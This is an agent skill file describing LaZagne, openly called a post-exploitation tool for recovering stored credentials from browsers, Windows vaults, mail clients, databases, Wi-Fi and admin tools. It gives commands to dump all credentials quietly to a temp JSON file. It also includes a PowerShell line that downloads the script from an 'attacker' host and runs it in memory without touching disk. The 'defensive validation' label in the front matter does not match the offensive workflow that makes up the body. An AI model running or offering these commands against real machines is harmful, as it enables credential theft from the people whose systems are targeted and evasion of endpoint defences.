---
name: lazagne
description: "Auth/lab ref: LaZagne secret-exposure audit; browser/app/Wi-Fi/Git artifacts, user/admin context, defensive validation evidence."
license: MIT
compatibility: "Windows primary; Linux/macOS support; privilege scope affects artifact visibility."
metadata:
  author: AeonDave
  version: "1.0"
---

# LaZagne

Post-exploitation credential recovery from installed applications — browsers, mail, Git, databases, WiFi, and more.

## Quick Start

```cmd
# Dump everything
lazagne.exe all

# Browsers only
lazagne.exe browsers

# Specific module
lazagne.exe windows
```

## Module Categories

| Category | What's Covered |
|----------|----------------|
| `browsers` | Chrome, Firefox, Edge, Opera, IE, Brave |
| `windows` | Credential Manager, DPAPI, LSA secrets, Vault |
| `mails` | Thunderbird, Outlook, Outlook Express |
| `databases` | MySQL, PostgreSQL, MSSQL, Oracle |
| `network` | WiFi passwords, VPN (Cisco, OpenVPN, WireGuard) |
| `memory` | KeePass, mRemoteNG, Pidgin |
| `git` | Git credentials |
| `chats` | Skype |
| `sysadmin` | WinSCP, PuTTY, FileZilla, mRemoteNG, TeamViewer |

## Core Flags

| Flag | Description |
|------|-------------|
| `all` | Run all modules |
| `<module>` | Run specific module category |
| `-oJ <file>` | JSON output |
| `-oN <file>` | Text output |
| `-oA <dir>` | All output formats to directory |
| `-v` | Verbose |
| `-vv` | Debug |
| `-quiet` | No banner |

## Common Workflows

```cmd
# Full credential dump to JSON
lazagne.exe all -oJ C:\Windows\Temp\creds.json -quiet

# Browser creds only
lazagne.exe browsers -v

# Sysadmin tool creds (WinSCP, FileZilla, etc.)
lazagne.exe sysadmin

# WiFi passwords
lazagne.exe network

# Run from PowerShell (in-memory if needed)
# Download and run without dropping to disk:
IEX(New-Object Net.WebClient).DownloadString('http://attacker/LaZagne.py')
```

## Output Example

```
[+] Password found !!!
URL: https://corp-mail.example.com
Login: john.doe@example.com  
Password: Summer2024!
```

## Resources

| File | When to load |
|------|--------------|
| `references/credential-sources.md` | Module details, DPAPI decryption, browser DB paths, output parsing |

## Structuring This Skill
